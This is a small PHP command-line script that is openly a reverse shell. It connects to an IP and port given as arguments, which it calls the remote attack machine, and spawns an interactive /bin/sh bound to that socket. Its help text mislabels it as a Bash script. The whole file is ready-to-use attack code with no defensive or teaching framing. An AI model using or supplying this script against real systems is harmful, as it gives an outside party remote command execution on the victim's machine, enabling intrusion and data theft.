#!/usr/bin/php
<?php

function show_usage() {
    global $argv;
    echo "usage: $argv[0] IP PORT\n" ;
	echo "\n";
	echo "Simple Reverse Shell script in Bash that connects to a remote machine.\n";
}

function show_help() {
    show_usage();
	echo "\n";
	echo "positional arguments:\n";
	echo "  IP          IPv4 address of the remote machine\n";
	echo "  PORT        Port of the remote machine\n";
}

# Only accept the two positional arguments: IP, PORT
if ($argc != 3) {
    show_help();
    exit(1);
}

# IP Address and Port of remote Attack Machine Server
$IP = $argv[1];
$PORT = intval($argv[2]); # Convert Port to int

# File descriptor for redirection
$FD = 3;

# Create a Network Socket and Connect to remote Machine
$sock = fsockopen($IP, $PORT);

# Send reverse shell
exec("/bin/sh -i <&$FD >&$FD 2>&$FD");
# TODO: Try other fd if 3 not available

?>
